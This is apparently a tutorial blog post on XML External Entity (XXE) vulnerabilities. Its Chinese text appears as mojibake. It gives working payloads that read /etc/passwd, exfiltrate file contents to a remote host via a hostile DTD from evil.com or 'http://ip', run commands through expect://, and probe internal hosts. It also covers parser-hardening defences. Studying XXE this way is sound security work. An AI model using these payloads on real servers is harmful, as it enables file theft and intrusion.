<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  
  <title>ã€VULNERABLITYã€‘XML External Entity(XXE) | 0kami&#39;s Blog</title>
  <meta name="description" content="A Web ğŸ¶ &amp;&amp; Code Reviewer">
  <meta name="keywords" content>
  <meta name="HandheldFriendly" content="True">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <link rel="shortcut icon" href="/images/avatar.jpg">
  <link rel="alternate" href="/atom.xml" title="0kami's Blog">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="æè¿°XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ªsecurity.tencent.com">
<meta name="keywords" content="vul">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€VULNERABLITYã€‘XML External Entity(XXE)">
<meta property="og:url" content="http://blog.0kami.cn/2016/06/28/old-xxe/index.html">
<meta property="og:site_name" content="0kami&#39;s Blog">
<meta property="og:description" content="æè¿°XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ªsecurity.tencent.com">
<meta property="og:locale" content="en">
<meta property="og:updated_time" content="2018-01-25T07:33:15.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="ã€VULNERABLITYã€‘XML External Entity(XXE)">
<meta name="twitter:description" content="æè¿°XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ªsecurity.tencent.com">

  <link href="https://fonts.googleapis.com/css?family=Inconsolata|Titillium+Web" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Roboto+Mono" rel="stylesheet">
  <link href="//cdn.bootcss.com/node-waves/0.7.5/waves.min.css" rel="stylesheet">
  <link rel="stylesheet" href="/style.css">
  <script>
    function setLoadingBarProgress(num) {
      document.getElementById('loading-bar').style.width=num+"%";
    }
  </script>
</head>
</html>
<body>
  <div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>


  <script>setLoadingBarProgress(20)</script> 
  <header class="l_header">
	<div class='wrapper'>
		<div class="nav-main container container--flex">
			<a class="logo flat-box" href='/' >
				0kami's Blog
			</a>
			<div class='menu'>
				<ul class='h-list'>
					
						<li>
							<a class='flat-box nav-home' href='/'>
								Home
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-archives' href='/archives'>
								Archives
							</a>
						</li>
					
						<li>
							<a class='flat-box nav-about' href='/about'>
								About
							</a>
						</li>
					
				</ul>
				<div class='underline'></div>
			</div>
			
				<div class="m_search">
					<form name="searchform" class="form u-search-form">
						<input type="text" class="input u-search-input" placeholder="Search" />
						<span class="icon icon-search"></span>
					</form>
				</div>
			
			<ul class='switcher h-list'>
				
					<li class='s-search'><a href='javascript:void(0)'><span class="icon icon-search flat-box"></span></a></li>
				
				<li class='s-menu'><a href='javascript:void(0)'><span class="icon icon-menu flat-box"></span></a></li>
			</ul>
		</div>
		
		<div class='nav-sub container container--flex'>
			<a class="logo" class="flat-box" href='javascript:void(0)'>
				Word of Forks
			</a>

			<ul class='switcher h-list'>
				<li class='s-comment'><a href='javascript:void(0)'><span class="icon icon-chat_bubble_outline flat-box"></span></a></li>
				<li class='s-top'><a href='javascript:void(0)'><span class="icon icon-arrow_upward flat-box"></span></a></li>
				<li class='s-toc'><a href='javascript:void(0)'><span class="icon icon-format_list_numbered flat-box"></span></a></li>
			</ul>
		</div>
	</div>
</header>
<aside class="menu-phone">
	<nav>
		
			<a href="/" class="nav-home nav">
				Home
			</a>
		
			<a href="/archives" class="nav-archives nav">
				Archives
			</a>
		
			<a href="/about" class="nav-about nav">
				About
			</a>
		
	</nav>
</aside>

    <script>setLoadingBarProgress(40);</script>
  <div class="l_body">
    <div class='container clearfix'>
      <div class='l_main'>
        <article id="post-old-xxe"
  class="post white-box article-type-post"
  itemscope itemprop="blogPost">
	<section class='meta'>
	<h2 class="title">
  	<a href="/2016/06/28/old-xxe/">
    	ã€VULNERABLITYã€‘XML External Entity(XXE)
    </a>
  </h2>
	<time>
	  Jun 28, 2016
	</time>
	
    
    <div class='cats'>
        <a href="/categories/notes/">notes</a>
    </div>

	</section>
	
		<section class="toc-wrapper"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#æè¿°"><span class="toc-number">1.</span> <span class="toc-text">æè¿°</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#å†…éƒ¨å£°æ˜DTD"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">å†…éƒ¨å£°æ˜DTD</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#å¼•ç”¨å¤–éƒ¨DTD"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">å¼•ç”¨å¤–éƒ¨DTD</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#å†…éƒ¨å£°æ˜å®ä½“"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">å†…éƒ¨å£°æ˜å®ä½“</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#å¼•ç”¨å¤–éƒ¨å®ä½“"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">å¼•ç”¨å¤–éƒ¨å®ä½“</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#æ¼æ´æè¿°æ‘˜è‡ªOWASP"><span class="toc-number">1.0.0.5.</span> <span class="toc-text">æ¼æ´æè¿°æ‘˜è‡ªOWASP</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#è¯•éªŒ"><span class="toc-number">2.</span> <span class="toc-text">è¯•éªŒ</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#demo1-ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#demo2-ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#demo3-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><span class="toc-number">2.0.0.3.</span> <span class="toc-text">demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#demo4-æ¢æµ‹å†…ç½‘åº”ç”¨"><span class="toc-number">2.0.0.4.</span> <span class="toc-text">demo4 æ¢æµ‹å†…ç½‘åº”ç”¨</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#é˜²å¾¡"><span class="toc-number">3.</span> <span class="toc-text">é˜²å¾¡</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jsonèŠ‚ç‚¹çš„Content-Type-XXEæ”»å‡»"><span class="toc-number">4.</span> <span class="toc-text">jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks"><span class="toc-number">4.0.1.</span> <span class="toc-text">å¸¦ä¸Šä¸€ä¸ªxxe-cheat-sheetï¼ŒDTD-Attacks</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#å‚è€ƒsecurity-tencent-comï¼Œ91ri-org"><span class="toc-number"></span> <span class="toc-text">å‚è€ƒsecurity.tencent.comï¼Œ91ri.org</span></a></section>
	
	<section class="article typo">
  	<div class="article-entry" itemprop="articleBody">
    	<h3 id="æè¿°"><a href="#æè¿°" class="headerlink" title="æè¿°"></a>æè¿°</h3><p>XMLçš„ä¸€äº›åŸºç¡€çŸ¥è¯†ï¼Œæ‘˜è‡ª<a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">security.tencent.com</a><br><a id="more"></a><br>XMLä¾‹å­<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span>  xmlå£°æ˜</span><br><span class="line"><span class="meta">&lt;!DOCTYPE note[   æ–‡æ¡£ç±»å‹å®šä¹‰</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT note (to,from,heading,body)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT to   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT from   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT heading   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">	&lt;!ELEMENT body   (#PCDATA)&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> æ–‡æ¡£å…ƒç´ </span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>This is a Test<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>ä¸Šè¿°ä¸ºä¸€ä¸ªXMLçš„å®ä¾‹<br>DTDï¼ˆæ–‡æ¡£ç±»å‹å®šä¹‰ï¼‰çš„ä½œç”¨æ˜¯å®šä¹‰ XML æ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ã€‚DTD å¯ä»¥åœ¨ XML æ–‡æ¡£å†…å£°æ˜ï¼Œä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ã€‚</p>
<h6 id="å†…éƒ¨å£°æ˜DTD"><a href="#å†…éƒ¨å£°æ˜DTD" class="headerlink" title="å†…éƒ¨å£°æ˜DTD"></a>å†…éƒ¨å£°æ˜DTD</h6><p><code>&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</code></p>
<h6 id="å¼•ç”¨å¤–éƒ¨DTD"><a href="#å¼•ç”¨å¤–éƒ¨DTD" class="headerlink" title="å¼•ç”¨å¤–éƒ¨DTD"></a>å¼•ç”¨å¤–éƒ¨DTD</h6><p><code>&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</code>æˆ–è€…<code>&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;public_ID&quot; &quot;æ–‡ä»¶å&quot;&gt;</code><br>DTDå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå¯ä»¥å†…éƒ¨å£°æ˜æˆ–å¤–éƒ¨å¼•ç”¨ã€‚</p>
<h6 id="å†…éƒ¨å£°æ˜å®ä½“"><a href="#å†…éƒ¨å£°æ˜å®ä½“" class="headerlink" title="å†…éƒ¨å£°æ˜å®ä½“"></a>å†…éƒ¨å£°æ˜å®ä½“</h6><p><code>&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</code></p>
<h6 id="å¼•ç”¨å¤–éƒ¨å®ä½“"><a href="#å¼•ç”¨å¤–éƒ¨å®ä½“" class="headerlink" title="å¼•ç”¨å¤–éƒ¨å®ä½“"></a>å¼•ç”¨å¤–éƒ¨å®ä½“</h6><p><code>&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</code>æˆ–è€…<code>&lt;!ENTITY å®ä½“åç§° PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;</code></p>
<h6 id="æ¼æ´æè¿°æ‘˜è‡ªOWASP"><a href="#æ¼æ´æè¿°æ‘˜è‡ªOWASP" class="headerlink" title="æ¼æ´æè¿°æ‘˜è‡ªOWASP"></a>æ¼æ´æè¿°æ‘˜è‡ª<a href="https://www.owasp.org/index.php/XML_External_Entity_%28XXE%29_Processing" target="_blank" rel="noopener">OWASP</a></h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</span><br></pre></td></tr></table></figure>
<p>æ¼æ´æˆå› ä¸ºXMLè§£æå™¨é…ç½®ä¸å®‰å…¨æ—¶ï¼Œå½“å…è®¸å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p>
<h3 id="è¯•éªŒ"><a href="#è¯•éªŒ" class="headerlink" title="è¯•éªŒ"></a>è¯•éªŒ</h3><p>æ¶æ„å¼•å…¥å¤–éƒ¨å®ä½“æ–¹å¼ï¼š</p>
<ul>
<li>æœ¬åœ°æ–‡ä»¶è¯»å–</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>è¿œç¨‹æ–‡ä»¶è¯»å–</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> <span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="meta">	&lt;!ENTITY % d SYSTEM "http://evil.com/evil.dtd"&gt;</span></span><br><span class="line"><span class="meta">	%d;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span>&amp;b;<span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br><span class="line">å…¶ä¸­evil.dtdæ–‡ä»¶å†…å®¹</span><br><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> <span class="attr">b</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯å¦‚æœé‡åˆ°è¯»å–å¤šè¡Œçš„æ–‡ä»¶ï¼Œå¯èƒ½ä¼šè¯»ä¸å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥çœ‹ä¸€ä¸‹<a href="http://zone.wooyun.org/content/26651" target="_blank" rel="noopener">ftpæ¥å—xxeæ•°æ®</a><br>ä¸åŒçš„è¯­è¨€é»˜è®¤æ”¯æŒçš„åè®®ä¸åŒ</p>
<table>
<thead>
<tr>
<th>libxml2</th>
<th>php</th>
<th>java</th>
<th>.net</th>
</tr>
</thead>
<tbody>
<tr>
<td>file<br>http<br>ftp</td>
<td>file<br>http<br>ftp<br>php<br>compress.zip<br>compress.bzip2<br>data<br>glob<br>phar</td>
<td>http<br>https<br>ftp<br>file<br>jar<br>netdoc<br>mailto<br>gopher *</td>
<td>http<br>file<br>https<br>ftp</td>
</tr>
</tbody>
</table>
<p>ä¸Šè¿°ä¸ºé»˜è®¤æ”¯æŒåè®®ï¼Œè¿˜å¯ä»¥é€šè¿‡æ‰©å±•æ”¯æŒå…¶ä»–åè®®ï¼Œå¦‚php</p>
<table>
<thead>
<tr>
<th>scheme</th>
<th>extension required</th>
</tr>
</thead>
<tbody>
<tr>
<td>https<br>ftps</td>
<td>openssl</td>
</tr>
<tr>
<td>zip</td>
<td>zip</td>
</tr>
<tr>
<td>ssh2.shell<br>ssh2.exec<br>ssh2.tunnel<br>ssh2.sftp<br>ssh2.scp</td>
<td>ssh2</td>
</tr>
<tr>
<td>rar</td>
<td>rar</td>
</tr>
<tr>
<td>ogg</td>
<td>oggvorbis</td>
</tr>
<tr>
<td>expect</td>
<td>expect</td>
</tr>
</tbody>
</table>
<h6 id="demo1-ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶"><a href="#demo1-ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶" class="headerlink" title="demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶"></a>demo1 ä»»æ„è¯»å–æœ¬åœ°æ–‡ä»¶</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">	&lt;!ENTITY b SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<h6 id="demo2-ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®"><a href="#demo2-ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®" class="headerlink" title="demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®"></a>demo2 ä¸å›æ˜¾è¯»å–å†…å®¹ï¼Œè¿œç¨‹ä¼ é€’æ•°æ®</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">	&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/issue"&gt;</span></span><br><span class="line"><span class="string">	&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt;</span></span><br><span class="line"><span class="string">	%dtd;</span></span><br><span class="line"><span class="string">	%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line">è¿œç¨‹DTDæ–‡ä»¶å†…å®¹</span><br><span class="line">&lt;!ENTITY % all <span class="string">"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;"</span>&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
<h6 id="demo3-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"><a href="#demo3-æ‰§è¡Œç³»ç»Ÿå‘½ä»¤" class="headerlink" title="demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤"></a>demo3 æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">	&lt;!ENTITY b SYSTEM "expect://id"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡ŒæˆåŠŸéœ€è¦phpçš„expectæ‰©å±•</p>
<h6 id="demo4-æ¢æµ‹å†…ç½‘åº”ç”¨"><a href="#demo4-æ¢æµ‹å†…ç½‘åº”ç”¨" class="headerlink" title="demo4 æ¢æµ‹å†…ç½‘åº”ç”¨"></a>demo4 æ¢æµ‹å†…ç½‘åº”ç”¨</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$xml=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">	&lt;!ENTITY b SYSTEM "http://192.168.1.20:80"&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$data=simplexml_load_string($xml);</span><br><span class="line"><span class="keyword">echo</span> $data;</span><br></pre></td></tr></table></figure>
<p>å¦‚æœä¸å­˜åœ¨è¯¥ipçš„åº”ç”¨ï¼Œä¼šæœ‰warning failed to open streamï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ¢æµ‹å†…å®¹åº”ç”¨<br>åŒæ—¶å¦‚æœæ‰¾åˆ°äº†å†…å®¹åº”ç”¨ï¼Œå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ”»å‡»å†…ç½‘åº”ç”¨</p>
<h3 id="é˜²å¾¡"><a href="#é˜²å¾¡" class="headerlink" title="é˜²å¾¡"></a>é˜²å¾¡</h3><h6 id="æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"><a href="#æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•" class="headerlink" title="æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•"></a>æ–¹æ¡ˆä¸€ã€ä½¿ç”¨å¼€å‘è¯­è¨€æä¾›çš„ç¦ç”¨å¤–éƒ¨å®ä½“çš„æ–¹æ³•</h6><ol>
<li>PHPï¼š<br>libxml_disable_entity_loader(true);</li>
<li>JAVA:<br>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();<br>dbf.setExpandEntityReferences(false);</li>
<li>Pythonï¼š<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li>
</ol>
<h6 id="æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"><a href="#æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®" class="headerlink" title="æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®"></a>æ–¹æ¡ˆäºŒã€è¿‡æ»¤ç”¨æˆ·æäº¤çš„XMLæ•°æ®</h6><p>å…³é”®è¯ï¼š&lt;!DOCTYPEå’Œ&lt;!ENTITYï¼Œæˆ–è€…ï¼ŒSYSTEMå’ŒPUBLICã€‚</p>
<h3 id="jsonèŠ‚ç‚¹çš„Content-Type-XXEæ”»å‡»"><a href="#jsonèŠ‚ç‚¹çš„Content-Type-XXEæ”»å‡»" class="headerlink" title="jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»"></a>jsonèŠ‚ç‚¹çš„Content-Type XXEæ”»å‡»</h3><p>å¦‚ä»Šå¾ˆå¤šwebåº”ç”¨ç¨‹åºä½¿ç”¨çš„éƒ½æ˜¯jsonæ ¼å¼çš„æ•°æ®ä¼ é€’ï¼Œé€šè¿‡åœ¨http requestå¤´ä¸­å¸¦å…¥<code>Content-Type: application/json</code>è¡¨æ˜ä¼ é€’çš„æ˜¯jsonæ ¼å¼çš„æ•°æ®ã€‚ä½†æ˜¯æœ‰æ—¶å€™æœåŠ¡å™¨å¯ä»¥æ¥å—å¼€å‘äººå‘˜æ²¡æœ‰æ„æ–™åˆ°çš„å…¶ä»–æ•°æ®æ ¼å¼ï¼Œå¦‚xmlæ ¼å¼ã€‚å¦‚æœæœåŠ¡å™¨å¯ä»¥æ¥å—xmlæ ¼å¼çš„æ•°æ®ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½å­˜åœ¨xxeã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line"></span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line"></span><br><span class="line">&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line"></span><br><span class="line">&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125;</span><br></pre></td></tr></table></figure></p>
